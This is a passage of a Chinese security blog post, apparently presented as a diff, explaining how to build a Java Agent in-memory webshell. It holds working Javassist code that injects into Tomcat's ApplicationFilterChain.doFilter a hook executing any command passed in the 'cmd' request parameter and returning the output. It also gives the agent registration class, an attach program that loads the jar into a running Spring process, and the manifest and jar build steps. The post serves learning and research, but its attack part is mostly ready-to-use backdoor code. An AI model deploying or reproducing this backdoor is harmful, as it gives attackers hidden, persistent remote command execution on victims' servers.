class="line"></span><br><span class="line">public class Transformer implements ClassFileTransformer  &#123;</span><br><span class="line">    public static final String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(&quot;/&quot;,&quot;.&quot;);</span><br><span class="line">        //如果被拦截的类是ApplicationFilterChain，那么对其进行字节码动态修改</span><br><span class="line">        if (className.equals(ClassName))&#123;</span><br><span class="line">            // 创建一个ClassPool对象，获取默认的类搜索路径</span><br><span class="line">            ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">            try &#123;</span><br><span class="line">                // 从ClassPool对象中获取ApplicationFilterChain类的CtClass对象</span><br><span class="line">                CtClass clz = classPool.get(className);</span><br><span class="line"></span><br><span class="line">                // 从CtClass对象中获取doFilter方法的CtMethod对象</span><br><span class="line">                CtMethod doFilterMethod = clz.getDeclaredMethod(&quot;doFilter&quot;);</span><br><span class="line">                //在doFilter方法执行前插入一段代码</span><br><span class="line">                //这段代码从HTTP请求中获取名为“cmd”的参数，并将其作为命令在服务器上执行。然后，它将命令的输出发送回HTTP响应。</span><br><span class="line">                doFilterMethod.insertBefore(&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot; +</span><br><span class="line">                        &quot;javax.servlet.http.HttpServletResponse res = response;\n&quot; +</span><br><span class="line">                        &quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot; +</span><br><span class="line">                        &quot;if (cmd != null)&#123;\n&quot; +</span><br><span class="line">                        &quot;    try &#123;\n&quot; +</span><br><span class="line">                        &quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot; +</span><br><span class="line">                        &quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot; +</span><br><span class="line">                        &quot;        String line;\n&quot; +</span><br><span class="line">                        &quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot; +</span><br><span class="line">                        &quot;        while ((line=reader.readLine()) != null)&#123;\n&quot; +</span><br><span class="line">                        &quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot; +</span><br><span class="line">                        &quot;        &#125;\n&quot; +</span><br><span class="line">                        &quot;        response.getOutputStream().print(sb.toString());\n&quot; +</span><br><span class="line">                        &quot;        response.getOutputStream().flush();\n&quot; +</span><br><span class="line">                        &quot;        response.getOutputStream().close();\n&quot; +</span><br><span class="line">                        &quot;    &#125; catch (Exception e)&#123;\n&quot; +</span><br><span class="line">                        &quot;        e.printStackTrace();\n&quot; +</span><br><span class="line">                        &quot;    &#125;\n&quot; +</span><br><span class="line">                        &quot;&#125;&quot;);</span><br><span class="line">                byte[] bytes = clz.toBytecode();</span><br><span class="line">                // 将 clz 从 classpool 中删除以释放内存</span><br><span class="line">                clz.detach();</span><br><span class="line">                //返回修改后的ApplicationFilterChain类的字节码</span><br><span class="line">                return bytes;</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后编写AgentMain注册我们的Transformer ，然后遍历已加载的 class，如果存在ApplicationFilterChain类的话那么就调用 retransformClasses 对其进行重定义。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import Transformer.Transformer;</span><br><span class="line"></span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line">public class AgentMain &#123;</span><br><span class="line">    public static final String ClassName = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;</span><br><span class="line"></span><br><span class="line">    public static void agentmain(String agentArgs, Instrumentation ins) &#123;</span><br><span class="line">        ins.addTransformer(new Transformer(),true);</span><br><span class="line">        Class[] allLoadedClasses = ins.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        for (Class clazz : allLoadedClasses) &#123;</span><br><span class="line">            if (clazz.getName().equals(ClassName))&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    ins.retransformClasses(new Class[]&#123;clazz&#125;);</span><br><span class="line">                &#125;catch (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>Instrumentation</code>接口的 **<code>retransformClasses</code>**方法时会触发已注册的类转换器的 **<code>transform()</code>**方法。具体来说，当<code>retransformClasses</code>方法被调用时，JVM 会将指定的类**重新加载**，并将其字节码**传递给已注册的类转换器**进行转换。</p>
+<p>实现类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        String jar = &quot;D:\\java_agent\\src\\main\\java\\AgentMain3.jar&quot;;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list =VirtualMachine.list();</span><br><span class="line">        System.out.println(&quot;Running JVM list ...&quot;);</span><br><span class="line">        // 列出当前有哪些 JVM 进程在运行</span><br><span class="line">        for (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class="line">            System.out.println(vmd);</span><br><span class="line">            if(vmd.displayName().contains(&quot;com.example.demo.DemoApplication&quot;))&#123;</span><br><span class="line">                String id = vmd.id();</span><br><span class="line">                System.out.println(&quot;进程ID：&quot; + vmd.id() + &quot;，进程名称：&quot; + vmd.displayName());</span><br><span class="line">                VirtualMachine vm = VirtualMachine.attach(vmd.id());</span><br><span class="line">                vm.loadAgent(jar);</span><br><span class="line">                vm.detach();</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>出不来出不来，不知道什么原因一直出现如下报错：</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240108215948644.png" alt="image-20240108215948644"></p>
+<p>成功加载了jar文件，但并未成功初始化</p>
+<p>后面查看了一下spring的相关日志，说无法找到Agent.AgentMain类，然后我在spring项目下添加了Agent目录就行了</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240109101944849.png" alt="image-20240109101944849"></p>
+<p>jar文件的生成方法：</p>
+<p>Agent.MF</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: Agent.AgentMain</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">jar cvfm AgentMain3.jar Agent.Mf Agent\AgentMain.class Agent\MyTransformer.class</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/12/28/CVE-2023-4450%EF%BC%9Ajeecgboot%E7%A7%AF%E6%9C%A8%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%88%86%E6%9E%90/"> CVE-2023-4450：jeecgboot积木报表系统 模板注入远程代码执行&amp;分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/01/09/CC%E9%93%BE11/">CC链11 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/09/CC%E9%93%BE11/" rel="prev" title="CC链11">
+      <i class="fa fa-chevron-left"></i> CC链11
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/01/13/nginxWebUI-runCmd%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="next" title="nginxWebUI runCmd前台远程命令执行漏洞">
+      nginxWebUI runCmd前台远程命令执行漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJava-Agent%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是Java Agent？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-Agent%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">Java Agent启动方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0premain%E6%96%B9%E6%B3%95%EF%BC%88JVM%E5%90%AF%E5%8A%A8%E5%89%8D%E5%8A%A0%E8%BD%BD%EF%BC%89"><span class="nav-number">2.0.1.</span> <span class="nav-text">实现premain方法（JVM启动前加载）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BDagentmain%E6%96%B9%E6%B3%95"><span class="nav-number">2.0.2.</span> <span class="nav-text">加载agentmain方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.</span> <span class="nav-text">初步实现内存马</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
